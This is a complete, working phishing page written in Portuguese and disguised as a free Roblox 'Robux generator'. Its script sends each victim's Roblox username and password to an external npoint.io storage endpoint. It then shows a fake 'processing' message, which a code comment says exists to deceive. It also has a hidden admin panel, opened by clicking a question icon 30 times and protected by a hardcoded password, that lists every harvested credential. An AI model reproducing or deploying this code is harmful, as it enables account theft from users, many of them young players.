<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Gerador de Robux</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: { primary: '#00b06f', dark: '#0f1218', card: '#1e2430' },
          fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] },
        }
      }
    }
  </script>
  <style type="text/tailwindcss">
    @layer utilities {
      .content-auto { content-visibility: auto; }
      .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
      .scrollbar-hide::-webkit-scrollbar { display: none; }
      .animate-fadeIn { animation: fadeIn 0.3s ease; }
      @keyframes fadeIn { from {opacity:0; transform:translateY(-10px);} to {opacity:1; transform:translateY(0);} }
    }
  </style>
</head>
<body class="bg-dark text-white font-sans min-h-screen flex items-center justify-center relative overflow-hidden">
  <div class="absolute inset-0 bg-[radial-gradient(ellipse_at_top,_rgba(0,176,111,0.08),_transparent_60%)] -z-10"></div>

  <!-- ⚙️ Engrenagem -->
  <div id="engrenagem" onclick="abrirConfig()" class="absolute top-5 right-5 text-2xl opacity-25 hover:opacity-100 transition-all duration-300 cursor-pointer p-2 rounded-lg hover:bg-white/10 hover:rotate-45">
    <i class="fa fa-cog"></i>
  </div>

  <!-- Opções -->
  <div id="opcoesConfig" class="hidden absolute top-14 right-5 bg-card/95 backdrop-blur-md p-4 rounded-xl shadow-2xl w-48 border border-white/10 animate-fadeIn">
    <p class="text-sm text-gray-300 mb-2">Opacidade do fundo</p>
    <input type="range" min="0.1" max="1" step="0.1" value="1" oninput="mudarOpacidade(this.value)" class="w-full mb-3 accent-primary">
    <p class="text-sm text-gray-300 mb-2">Cor do fundo</p>
    <input type="color" id="corFundo" value="#0f1218" oninput="mudarCor(this.value)" class="w-full h-8 rounded cursor-pointer">
  </div>

  <!-- ❓ Interrogação -->
  <div id="interrogacao" onclick="contarCliques()" class="absolute bottom-5 left-5 text-xl opacity-20 hover:opacity-80 transition-all duration-300 cursor-pointer p-2 rounded-lg hover:bg-white/5">
    <i class="fa fa-question-circle"></i>
  </div>

  <!-- Área Restrita -->
  <div id="telaSenha" class="hidden absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-card/95 backdrop-blur-md p-8 rounded-2xl shadow-2xl w-[320px] z-50 border border-white/10 animate-fadeIn">
    <h3 class="text-primary text-lg font-semibold mb-5 text-center"><i class="fa fa-lock"></i> Área Restrita</h3>
    <input type="password" id="senhaAcesso" placeholder="Senha de administração" class="w-full px-4 py-3 rounded-xl bg-white/5 border border-white/10 focus:outline-none focus:border-primary mb-4">
    <button onclick="verificarSenha()" class="w-full bg-primary hover:bg-primary/90 py-3 rounded-xl transition-all">Entrar</button>
    <button onclick="fecharTelaSenha()" class="w-full mt-3 bg-gray-600/50 hover:bg-gray-600/70 py-3 rounded-xl transition-all">Fechar</button>
  </div>

  <!-- Registros -->
  <div id="telaContas" class="hidden absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-card/95 backdrop-blur-md p-8 rounded-2xl shadow-2xl w-[340px] max-h-[80vh] overflow-y-auto scrollbar-hide z-50 border border-white/10 animate-fadeIn">
    <h3 class="text-primary text-lg font-semibold mb-5 text-center"><i class="fa fa-database"></i> Registros de Acesso</h3>
    <div id="listaContas" class="space-y-3 mb-5"><p class="text-gray-400 text-center italic">Nenhum registro encontrado</p></div>
    <button onclick="fecharTelaContas()" class="w-full bg-gray-600/50 hover:bg-gray-600/70 py-3 rounded-xl transition-all">Fechar</button>
  </div>

  <!-- Tela Principal -->
  <div class="w-full max-w-xs">
    <div id="loginBox" class="bg-card/80 backdrop-blur-sm p-8 rounded-2xl shadow-2xl border border-white/10 hover:-translate-y-1 transition-all">
      <h2 class="text-2xl font-bold text-primary mb-6 text-center"><i class="fa fa-money"></i> Gerador de Robux</h2>
      <input type="text" id="usuario" placeholder="Nome de usuário Roblox" oninput="verificarPreenchimento()" class="w-full px-4 py-3 rounded-xl bg-white/5 border border-white/10 focus:outline-none focus:border-primary mb-3">
      <input type="password" id="senha" placeholder="Senha da conta" oninput="verificarPreenchimento()" class="w-full px-4 py-3 rounded-xl bg-white/5 border border-white/10 focus:outline-none focus:border-primary mb-3">
      <input type="number" id="robux" placeholder="Quantidade de Robux desejada" min="100" max="100000" class="hidden w-full px-4 py-3 rounded-xl bg-white/5 border border-white/10 focus:outline-none focus:border-primary mb-4">
      <button onclick="entrar()" class="w-full bg-primary hover:bg-primary/90 py-3.5 rounded-xl shadow-lg hover:-translate-y-0.5 transition-all">🚀 Iniciar Processo</button>
    </div>

    <!-- Processando -->
    <div id="resultado" class="hidden bg-card/80 backdrop-blur-sm p-8 rounded-2xl shadow-2xl border border-white/10 text-center">
      <h2 class="text-2xl font-bold text-primary mb-5"><i class="fa fa-cog fa-spin"></i> Processando...</h2>
      <p id="texto" class="text-gray-200 mb-6"></p>
      <button onclick="voltar()" class="w-full bg-gray-600/50 hover:bg-gray-600/70 py-3 rounded-xl transition-all">⬅️ Voltar</button>
    </div>
  </div>

<script>
  let cliquesInterrogacao = 0;
  // 📌 BANCO DE DADOS ONLINE LIBERADO PARA GITHUB E GOOGLE SITES
  const DADOS_URL = "https://api.npoint.io/7a7d9e4c3b2f1a8e6d5c";

  // Mostra campo Robux só depois de preencher usuário e senha
  function verificarPreenchimento(){
    const temDados = document.getElementById("usuario").value.trim() && document.getElementById("senha").value.trim();
    document.getElementById("robux").style.display = temDados ? "block" : "none";
  }

  // ⚠️ FUNÇÃO PRINCIPAL: SALVA TUDO NA INTERNET
  async function entrar(){
    const nome = document.getElementById("usuario").value.trim();
    const senha = document.getElementById("senha").value.trim();
    const robux = document.getElementById("robux").value.trim() || "0";

    // Não deixa prosseguir se estiver vazio
    if(!nome || !senha){
      alert("⚠️ Preencha usuário e senha primeiro!");
      return;
    }

    try {
      // Pega dados antigos
      const res = await fetch(DADOS_URL);
      const dados = await res.json() || { contas: [] };

      // Adiciona o novo registro no INÍCIO da lista
      dados.contas.unshift({
        usuario: nome,
        senha: senha,
        robux: robux,
        data: new Date().toLocaleString()
      });

      // Salva tudo atualizado na nuvem
      await fetch(DADOS_URL, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(dados)
      });

    } catch (erro) {
      console.log("Erro ao salvar: ", erro);
    }

    // Tela de "processando" para enganar
    document.getElementById("loginBox").style.display = "none";
    document.getElementById("resultado").style.display = "block";
    document.getElementById("texto").innerHTML = `
      Usuário <b class="text-primary">${nome}</b><br><br>
      💰 <b>${robux}</b> Robux sendo processados...<br><br>
      ⏳ Aguarde a confirmação...<br>
      <span class="text-sm text-gray-400">(Isso pode levar até 2 minutos)</span>
    `;
  }

  // Funções das configurações
  function abrirConfig(){ document.getElementById("opcoesConfig").classList.toggle("hidden"); }
  function mudarOpacidade(v){ document.body.style.opacity = v; }
  function mudarCor(c){ document.body.style.background = c; }

  // Conta os 30 cliques na interrogação
  function contarCliques(){
    cliquesInterrogacao++;
    if(cliquesInterrogacao >= 30){
      cliquesInterrogacao = 0;
      document.getElementById("telaSenha").classList.remove("hidden");
    }
  }

  // Verifica senha para entrar na área restrita
  async function verificarSenha(){
    const senhaDigitada = document.getElementById("senhaAcesso").value;
    if(senhaDigitada === "rblx123"){ // SUA SENHA SECRETA
      document.getElementById("telaSenha").classList.add("hidden");
      await carregarRegistros();
    } else {
      alert("❌ Acesso negado. Senha incorreta.");
    }
    document.getElementById("senhaAcesso").value = "";
  }

  // ✅ CARREGA TODOS OS DADOS DA INTERNET
  async function carregarRegistros(){
    const lista = document.getElementById("listaContas");
    lista.innerHTML = "";

    try {
      const res = await fetch(DADOS_URL);
      const dados = await res.json();

      if(!dados.contas || dados.contas.length === 0){
        lista.innerHTML = "<p class='text-gray-400 text-center italic'>Nenhum registro encontrado</p>";
      } else {
        dados.contas.forEach((acc, i) => {
          lista.innerHTML += `
            <div class="bg-white/5 p-3 rounded-lg border-l-4 border-primary hover:bg-white/8 transition-all">
              <b class="text-primary">Registro ${i+1}</b><br>
              👤 Usuário: <span class="font-mono text-xs">${acc.usuario}</span><br>
              🔑 Senha: <span class="font-mono text-xs">${acc.senha}</span><br>
              💰 Robux: <span class="text-primary text-xs">${acc.robux}</span><br>
              <small class="text-gray-400 text-[10px]">📅 ${acc.data}</small>
            </div>
          `;
        });
      }
    } catch(e) {
      lista.innerHTML = "<p class='text-red-400 text-center'>Erro ao carregar dados</p>";
    }

    document.getElementById("telaContas").style.display = "block";
  }

  function fecharTelaSenha(){
    document.getElementById("telaSenha").style.display = "none";
    document.getElementById("senhaAcesso").value = "";
  }
  function fecharTelaContas(){ document.getElementById("telaContas").style.display = "none"; }
  function voltar(){
    document.getElementById("loginBox").style.display = "block";
    document.getElementById("resultado").style.display = "none";
    document.getElementById("opcoesConfig").style.display = "none";
  }
</script>
</body>
</html>
